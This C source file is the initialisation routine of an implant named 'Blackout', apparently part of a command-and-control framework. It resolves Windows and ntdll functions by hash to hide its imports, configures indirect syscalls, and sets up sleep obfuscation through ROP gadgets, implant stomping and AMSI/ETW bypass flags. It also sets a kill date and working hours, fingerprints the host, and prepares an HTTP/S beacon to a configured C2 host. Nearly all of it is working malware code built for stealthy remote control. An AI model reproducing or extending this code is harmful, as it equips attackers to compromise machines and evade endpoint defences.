#include <common.h>
#include <utils.h>
#include <constexpr.h>
#include <evasion.h>

FUNC VOID BlackoutInit( 
    PVOID Param
 ) {
    BLACKOUT_INSTANCE

    Instance()->Teb = NtCurrentTeb();

    Instance()->Modules.Kernel32   = LdrModuleAddr( HASH_STR( "KERNEL32.DLL" ) );
    Instance()->Modules.Kernelbase = LdrModuleAddr( HASH_STR( "KERNELBASE.dll" ) );
    Instance()->Modules.Ntdll      = LdrModuleAddr( HASH_STR( "ntdll.dll" ) );

    Instance()->Win32.LoadLibraryA   = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryA" ) );
    Instance()->Win32.GetProcAddress = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetProcAddress" ) );

    Instance()->Win32.GetModuleHandleA          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetModuleHandleA" ) );
    Instance()->Win32.CreateTimerQueueTimer     = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateTimerQueueTimer" ) );
    Instance()->Win32.OpenProcess               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "OpenProcess" ) );
    Instance()->Win32.OpenThread                = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "OpenThread" ) );
    Instance()->Win32.CreateProcessA            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessA" ) );
    Instance()->Win32.CreateProcessW            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessW" ) );
    Instance()->Win32.CreateProcessAsUserA      = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessAsUserA" ) );
    Instance()->Win32.CreateProcessAsUserW      = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessAsUserW" ) );
    Instance()->Win32.CreateProcessWithLogonW   = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessWithLogonW" ) );
    Instance()->Win32.CreateProcessWithTokenW   = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessWithTokenW" ) );
    Instance()->Win32.WaitForDebugEvent         = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "WaitForDebugEvent" ) );
    Instance()->Win32.WriteProcessMemory        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "WriteProcessMemory" ) );
    Instance()->Win32.DebugActiveProcessStop    = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "DebugActiveProcessStop" ) );
    Instance()->Win32.ContinueDebugEvent        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "ContinueDebugEvent" ) );
    Instance()->Win32.FreeLibrary               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "FreeLibrary" ) );
    Instance()->Win32.CloseHandle               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CloseHandle" ) );
    Instance()->Win32.GetLastError              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetLastError" ) );
    Instance()->Win32.LocalAlloc                = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LocalAlloc" ) );
    Instance()->Win32.LocalFree                 = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LocalFree" ) );
    Instance()->Win32.LocalReAlloc              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LocalReAlloc" ) );
    Instance()->Win32.VirtualFree               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualFree" ) );
    Instance()->Win32.VirtualQuery              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualQuery" ) );
    Instance()->Win32.VirtualQueryEx            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualQueryEx" ) );
    Instance()->Win32.VirtualAlloc              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualAlloc" ) );
    Instance()->Win32.VirtualAllocEx            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualAllocEx" ) );
    Instance()->Win32.VirtualProtect            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualProtect" ) );
    Instance()->Win32.VirtualProtectEx          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualProtectEx" ) );
    Instance()->Win32.WaitForSingleObject       = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "WaitForSingleObject" ) );
    Instance()->Win32.WaitForSingleObjectEx     = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "WaitForSingleObjectEx" ) );
    Instance()->Win32.HeapWalk                  = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "HeapWalk" ) );
    Instance()->Win32.CreatePipe                = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreatePipe" ) );
    Instance()->Win32.CreateNamedPipeA          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateNamedPipeA" ) );
    Instance()->Win32.CreateNamedPipeW          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateNamedPipeW" ) );
    Instance()->Win32.ConnectNamedPipe          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "ConnectNamedPipe" ) );
    Instance()->Win32.CreateMailslotA           = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateMailslotA" ) );
    Instance()->Win32.CreateMailslotW           = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateMailslotW" ) );
    Instance()->Win32.CreateFileA               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateFileA" ) );
    Instance()->Win32.CreateFileW               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateFileW" ) );
    Instance()->Win32.ReadFile                  = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "ReadFile" ) );
    Instance()->Win32.FormatMessageA            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "FormatMessageA" ) );
    Instance()->Win32.GetCurrentDirectoryA      = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetCurrentDirectoryA" ) );
    Instance()->Win32.SetCurrentDirectoryA      = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "SetCurrentDirectoryA" ) );
    Instance()->Win32.CreateThread              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateThread" ) );
    Instance()->Win32.CreateRemoteThread        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateRemoteThread" ) );
    Instance()->Win32.QueueUserAPC              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "QueueUserAPC" ) ); 
    Instance()->Win32.GetTickCount              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetTickCount" ) );
    Instance()->Win32.GetComputerNameExA        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetComputerNameExA" ) );
    Instance()->Win32.TerminateProcess          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "TerminateProcess" ) );
    Instance()->Win32.GetProductInfo            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetProductInfo" ) );
    Instance()->Win32.GetNativeSystemInfo       = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetNativeSystemInfo" )  );
    Instance()->Win32.DuplicateHandle           = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "DuplicateHandle" )  );
    Instance()->Win32.GetThreadId               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetThreadId" )  );
    Instance()->Win32.ResumeThread              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "ResumeThread" )  );
    Instance()->Win32.SuspendThread             = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "SuspendThread" )  );
    Instance()->Win32.GetMappedFileNameA        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetMappedFileNameA" )  );
    Instance()->Win32.TerminateThread           = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "TerminateThread" )  );
    Instance()->Win32.SetFileInformationByHandle= LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "SetFileInformationByHandle" )  );
    Instance()->Win32.LoadLibraryExA            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryExA" )  );
    Instance()->Win32.LoadLibraryExW            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryExW" )  );
    Instance()->Win32.SetEvent                  = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "SetEvent" )  );
    Instance()->Win32.RtlCaptureContext         = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "RtlCaptureContext" )  );

    Instance()->Win32.RtlDeleteTimer            = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlDeleteTimer" ) );
    Instance()->Win32.RtlDeleteTimerQueue       = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlDeleteTimerQueue" ) );
    Instance()->Win32.RtlDeleteCriticalSection     = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlDeleteCriticalSection" )  );
    Instance()->Win32.RtlInitializeCriticalSection = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlInitializeCriticalSection" )  );
    Instance()->Win32.RtlCompareMemory          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlCompareMemory" )  );
    Instance()->Win32._RtlCopyMemory             = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlCopyMemory" )  );
    Instance()->Win32.RtlExitUserProcess        = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlExitUserProcess" ) );
    Instance()->Win32.RtlExitUserThread         = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlExitUserThread" ) );
    Instance()->Win32.RtlAllocateHeap           = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlAllocateHeap" ) );
    Instance()->Win32.RtlReAllocateHeap         = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlReAllocateHeap" ) );
    Instance()->Win32.RtlFreeHeap               = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlFreeHeap" ) );

    Instance()->Win32.NtUnmapViewOfSection      = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtUnmapViewOfSection" ) );
    Instance()->Win32.NtMapViewOfSection        = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtMapViewOfSection" ) );
    Instance()->Win32.NtCreateSection           = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateSection" ) );
    Instance()->Win32.TpReleaseCleanupGroupMembers = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "TpReleaseCleanupGroupMembers" ) );
    Instance()->Win32.NtFreeVirtualMemory       = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtFreeVirtualMemory" )  );
    Instance()->Win32.RtlCreateTimer            = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlCreateTimer" ) );
    Instance()->Win32.RtlRandomEx               = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlRandomEx" ) );
    Instance()->Win32.RtlGetVersion             = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlGetVersion" ));
    Instance()->Win32.RtlIpv6StringToAddressA   = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlIpv6StringToAddressA" ) );
    Instance()->Win32.NtAllocateVirtualMemory   = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtAllocateVirtualMemory" ) );
    Instance()->Win32.NtProtectVirtualMemory    = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtProtectVirtualMemory" ) );
    Instance()->Win32.NtCreateThreadEx          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateThreadEx" ) );
    Instance()->Win32.LdrLoadDll                = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "LdrLoadDll" ) );
    Instance()->Win32.LdrUnloadDll              = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "LdrUnloadDll" ) );
    Instance()->Win32.NtGetNextProcess          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtGetNextProcess" ) );

    Instance()->Win32.NtQuerySystemInformation  = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQuerySystemInformation" ) );
    Instance()->Win32.NtQueryInformationProcess = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQueryInformationProcess" ) );
    Instance()->Win32.NtQueryVirtualMemory      = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQueryVirtualMemory" ) );
    Instance()->Win32.NtQueryInformationToken   = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQueryInformationToken" ) );
    Instance()->Win32.NtQueryInformationThread  = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQueryInformationThread" ) );
    Instance()->Win32.NtSetInformationVirtualMemory = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSetInformationVirtualMemory" ) );
    
    Instance()->Win32.RtlAddVectoredContinueHandler      = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlAddVectoredContinueHandler" ) );
    Instance()->Win32.RtlAddVectoredExceptionHandler     = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlAddVectoredExceptionHandler" ) );
    Instance()->Win32.RtlRemoveVectoredContinueHandler   = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlRemoveVectoredContinueHandler" ) );
    Instance()->Win32.RtlRemoveVectoredExceptionHandler  = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlRemoveVectoredExceptionHandler" ) );

    Instance()->Win32.RtlCreateTimerQueue       = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlCreateTimerQueue" ) );
    Instance()->Win32.NtAlertResumeThread       = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtAlertResumeThread" ) );
    Instance()->Win32.NtContinue                = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtContinue" ) );
    Instance()->Win32.NtCreateEvent             = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateEvent" ) );
    Instance()->Win32.NtCreateThreadEx          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateThreadEx" ) );
    Instance()->Win32.NtQueueApcThread          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQueueApcThread" ) );
    Instance()->Win32.NtGetContextThread        = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtGetContextThread" ) );
    Instance()->Win32.NtSetContextThread        = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSetContextThread" ) );
    Instance()->Win32.NtTestAlert               = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtTestAlert" ) );
    Instance()->Win32.NtWaitForSingleObject     = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtWaitForSingleObject" ) );
    Instance()->Win32.NtSignalAndWaitForSingleObject = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSignalAndWaitForSingleObject" ) );
    Instance()->Win32.NtCreateFile              = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateFile" ) );
    Instance()->Win32.NtCreateNamedPipeFile     = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateNamedPipeFile" ) );   
    Instance()->Win32.NtWriteVirtualMemory      = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtWriteVirtualMemory" ) ); 
    Instance()->Win32.NtOpenProcess             = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtOpenProcess" ) ); 
    Instance()->Win32.NtResumeThread            = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtResumeThread" ) ); 
    Instance()->Win32.NtSuspendThread           = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSuspendThread" ) ); 
    Instance()->Win32.NtSuspendProcess          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSuspendProcess" ) ); 
    Instance()->Win32.NtTerminateThread         = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtTerminateThread" ) ); 
    Instance()->Win32.NtOpenProcessToken        = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtOpenProcessToken" ) ); 
    Instance()->Win32.NtOpenProcessTokenEx      = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtOpenProcessTokenEx" ) ); 
    Instance()->Win32.NtOpenThreadToken         = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtOpenThreadToken" ) ); 
    Instance()->Win32.NtOpenThreadTokenEx       = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtOpenThreadTokenEx" ) ); 

    Instance()->Modules.Winhttp   = LdrModuleAddr( HASH_STR( "Winhttp.dll" ) );
    Instance()->Modules.Advapi32  = LdrModuleAddr( HASH_STR( "Advapi32.dll" ) );
    Instance()->Modules.Msvcrt    = LdrModuleAddr( HASH_STR( "msvcrt.dll" ) );
    Instance()->Modules.Cryptbase = LdrModuleAddr( HASH_STR( "Cryptbase.dll" ) ); 
    Instance()->Modules.Iphlpapi  = LdrModuleAddr( HASH_STR( "IPHLPAPI.DLL" ) );

    if ( !Instance()->Modules.Winhttp   ) Instance()->Modules.Winhttp   = LdrLoadLib( L"Winhttp.dll"   );
    if ( !Instance()->Modules.Advapi32  ) Instance()->Modules.Advapi32  = LdrLoadLib( L"Advapi32.dll"  );
    if ( !Instance()->Modules.Msvcrt    ) Instance()->Modules.Msvcrt    = LdrLoadLib( L"Msvcrt.dll"    );
    if ( !Instance()->Modules.Cryptbase ) Instance()->Modules.Cryptbase = LdrLoadLib( L"Cryptbase.dll" );
    if ( !Instance()->Modules.Iphlpapi  ) Instance()->Modules.Iphlpapi  = LdrLoadLib( L"Iphlpapi.dll"  );

    Instance()->Win32.AdjustTokenPrivileges = LdrFuncAddr( Instance()->Modules.Advapi32, HASH_STR( "AdjustTokenPrivileges" ) );
    Instance()->Win32.LookupPrivilegeValueA = LdrFuncAddr( Instance()->Modules.Advapi32, HASH_STR( "LookupPrivilegeValueA" ) );
    Instance()->Win32.LookupAccountSidA     = LdrFuncAddr( Instance()->Modules.Advapi32, HASH_STR( "LookupAccountSidA" ) );
    Instance()->Win32.GetUserNameA          = LdrFuncAddr( Instance()->Modules.Advapi32, HASH_STR( "GetUserNameA" ) );
    Instance()->Win32.OpenProcessToken      = LdrFuncAddr( Instance()->Modules.Advapi32, HASH_STR( "OpenProcessToken" ) );
    Instance()->Win32.OpenThreadToken       = LdrFuncAddr( Instance()->Modules.Advapi32, HASH_STR( "OpenThreadToken" ) );
    Instance()->Win32.DuplicateToken        = LdrFuncAddr( Instance()->Modules.Advapi32, HASH_STR( "DuplicateToken" ) );

    Instance()->Win32.WinHttpOpen               = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpOpen" ) );
    Instance()->Win32.WinHttpConnect            = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpConnect" ) );
    Instance()->Win32.WinHttpOpenRequest        = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpOpenRequest" ) );
    Instance()->Win32.WinHttpReceiveResponse    = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpReceiveResponse" ) );
    Instance()->Win32.WinHttpSendRequest        = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpSendRequest" ) );
    Instance()->Win32.WinHttpReadData           = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpReadData" ) );
    Instance()->Win32.WinHttpSetOption          = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpSetOption") );
    Instance()->Win32.WinHttpCloseHandle        = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpCloseHandle" ) );

    Instance()->Win32.SystemFunction040 = LdrFuncAddr( Instance()->Modules.Cryptbase, HASH_STR( "SystemFunction040" ) );
    Instance()->Win32.SystemFunction041 = LdrFuncAddr( Instance()->Modules.Cryptbase, HASH_STR( "SystemFunction041" ) );

    Instance()->Win32.GetAdaptersInfo = LdrFuncAddr( Instance()->Modules.Iphlpapi, HASH_STR( "GetAdaptersInfo" ) );

    Instance()->Win32.printf  = LdrFuncAddr( Instance()->Modules.Msvcrt, HASH_STR( "printf" ) );
    Instance()->Win32.strncmp = LdrFuncAddr( Instance()->Modules.Msvcrt, HASH_STR( "strncmp" ) );
    Instance()->Win32.vprintf = LdrFuncAddr( Instance()->Modules.Msvcrt, HASH_STR( "vprintf" ) );

    /*=============================[ init syscall config ]=============================*/

    InitNtdllConf();

    FetchNtSyscall(HASH_STR("NtAllocateVirtualMemory"), &Syscall().SysTable.NtAllocateVirtualMemory);
    FetchNtSyscall(HASH_STR("NtProtectVirtualMemory"), &Syscall().SysTable.NtProtectVirtualMemory);
    FetchNtSyscall(HASH_STR("NtWriteVirtualMemory"), &Syscall().SysTable.NtWriteVirtualMemory);
    FetchNtSyscall(HASH_STR("NtOpenProcess"), &Syscall().SysTable.NtOpenProcess);
    FetchNtSyscall(HASH_STR("NtOpenThread"), &Syscall().SysTable.NtOpenThread);
    FetchNtSyscall(HASH_STR("NtOpenThreadToken"), &Syscall().SysTable.NtOpenThreadToken);
    FetchNtSyscall(HASH_STR("NtOpenProcessToken"), &Syscall().SysTable.NtOpenProcessToken);
    FetchNtSyscall(HASH_STR("NtClose"), &Syscall().SysTable.NtClose);
    FetchNtSyscall(HASH_STR("NtQueryVirtualMemory"), &Syscall().SysTable.NtQueryVirtualMemory);
    FetchNtSyscall(HASH_STR("NtFreeVirtualMemory"), &Syscall().SysTable.NtFreeVirtualMemory);
    FetchNtSyscall(HASH_STR("NtCreateThreadEx"), &Syscall().SysTable.NtCreateThreadEx);
    FetchNtSyscall(HASH_STR("NtTerminateThread"), &Syscall().SysTable.NtTerminateThread);
    FetchNtSyscall(HASH_STR("NtTerminateProcess"), &Syscall().SysTable.NtTerminateProcess);
    FetchNtSyscall(HASH_STR("NtSuspendThread"), &Syscall().SysTable.NtSuspendThread);
    FetchNtSyscall(HASH_STR("NtResumeThread"), &Syscall().SysTable.NtResumeThread);
    FetchNtSyscall(HASH_STR("NtCreateFile"), &Syscall().SysTable.NtCreateFile);
    FetchNtSyscall(HASH_STR("NtWriteFile"), &Syscall().SysTable.NtWriteFile);
    FetchNtSyscall(HASH_STR("NtCreateSection"), &Syscall().SysTable.NtCreateSection);
    FetchNtSyscall(HASH_STR("NtMapViewOfSection"), &Syscall().SysTable.NtMapViewOfSection);
    FetchNtSyscall(HASH_STR("NtUnmapViewOfSection"), &Syscall().SysTable.NtUnmapViewOfSection);
    FetchNtSyscall(HASH_STR("NtGetContextThread"), &Syscall().SysTable.NtGetContextThread);
    FetchNtSyscall(HASH_STR("NtSetContextThread"), &Syscall().SysTable.NtSetContextThread);
    FetchNtSyscall(HASH_STR("NtWaitForSingleObject"), &Syscall().SysTable.NtWaitForSingleObject);
    FetchNtSyscall(HASH_STR("NtQueueApcThread"), &Syscall().SysTable.NtQueueApcThread);

    /*============================[ Agent config initialization ]============================*/

#ifdef BK_STOMP
    CreateImplantBackup();
#endif

    Blackout().SleepObf.Technique        = _BK_SLEEP_OBF_; 
    Blackout().SleepObf.NtContinueGadget = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "LdrInitializeThunk" ) ) + 19;
    Blackout().SleepObf.JmpGadget        = FindJmpGadget( Instance()->Modules.Kernel32, 0x23 );
    Instance()->Session.WorkingHours     = CONFIG_WRKHRS;
    Instance()->Session.KillDate         = CONFIG_KILLDATE;
    Instance()->Session.SleepTime        = CONFIG_SLEEP;
    Instance()->Session.Jitter           = 0x00;
    Instance()->Session.AgentId          = RandomNumber32();
    Blackout().AmsiBypass                = FALSE;
    Blackout().EtwBypass                 = FALSE;
    Instance()->Session.ProcessId        = U_32( Instance()->Teb->ClientId.UniqueProcess );
    Instance()->Session.ThreadId         = U_32( Instance()->Teb->ClientId.UniqueThread );

    /*============================[ Machine recognition ]============================*/

    GetComputerInfo( 
        &Instance()->System.OsArch,
        &Instance()->System.ProcessorType,
        &Instance()->System.ProductType,
        &Instance()->System.IpAddress
    );

    Instance()->System.OsMajorV        = Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion;
    Instance()->System.OsMinorv        = Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion;
    Instance()->System.OsBuildNumber   = Instance()->Teb->ProcessEnvironmentBlock->OSBuildNumber;

    Instance()->System.OsArch        = 0;
    Instance()->System.ProcessorType = 0;
    
    /*============================[ Http/s listener config ]============================*/

    Transport().Http.Host      = bkHeapAlloc( MAX_PATH * 2 );
    Transport().Http.UserAgent = bkHeapAlloc( MAX_PATH * 2 );
    Transport().Http.Port      = CONFIG_PORT;
    Transport().Http.Secure    = CONFIG_SECURE;
    MmCopy( Transport().Http.Host,      CONFIG_HOST,      sizeof( CONFIG_HOST      ) );
    MmCopy( Transport().Http.UserAgent, CONFIG_USERAGENT, sizeof( CONFIG_USERAGENT ) );

    /*============================[ Process Informations ]============================*/

    GetProcessInfo( 
        &Instance()->Session.ProcessFullPath, 
        &Instance()->Session.ProcessName, 
        &Instance()->Session.ProcessCmdLine 
    );

    /*============================[ CFG Routine to SleepObf ]============================*/

    if ( CfgCheckEnabled() ) {
        CfgAddressAdd( Instance()->Modules.Kernel32,  Instance()->Win32.VirtualProtect );
        CfgAddressAdd( Instance()->Modules.Cryptbase, Instance()->Win32.SystemFunction040  );
        CfgAddressAdd( Instance()->Modules.Cryptbase, Instance()->Win32.SystemFunction041  );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32._RtlCopyMemory );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtContinue );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtSetContextThread );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtGetContextThread );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtTestAlert );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtWaitForSingleObject );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.RtlExitUserThread );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtProtectVirtualMemory );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.RtlCreateTimer );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.RtlCreateTimerQueue );
    }
}